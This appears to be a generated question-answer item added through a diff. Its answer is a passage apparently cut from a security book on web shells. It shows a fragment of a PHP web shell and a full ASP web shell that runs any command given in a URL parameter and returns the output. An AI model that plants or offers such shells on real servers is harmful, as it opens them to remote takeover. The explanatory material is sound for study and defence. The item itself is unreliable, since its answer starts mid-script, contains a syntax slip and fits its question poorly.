@@ -1,0 +1,28 @@
+TECHNIQUE / QUESTION:
+Describe the steps or process outlined in the following text: (Context: from Document)
+
+CONTEXT:
+Source: Unknown
+Section: General
+Pages: N/A
+
+METHOD / ANSWER:
+system($_GET['cmd']);
+}
+?>
+The short script exerpt executes system commands provided via the cmd
+URL parameter. Let’s explore a few additional examples of web shells
+written in different scripting languages, such as ASP, JavaScript, and JSP.
+Example 6-2 shows another web shell example in ASP applications.
+Example 6-2 Web Shell in ASP Applications
+<%
+If Request.QueryString("cmd") <> "" Then
+Dim objShell
+Set objShell = Server.CreateObject("WScript.Shell"
+Dim command, result
+command = Request.QueryString("cmd")
+Set result = objShell.Exec(command)
+Response.Write(result.StdOut.ReadAll())
+Set objShell = Nothing
+End If
+%>
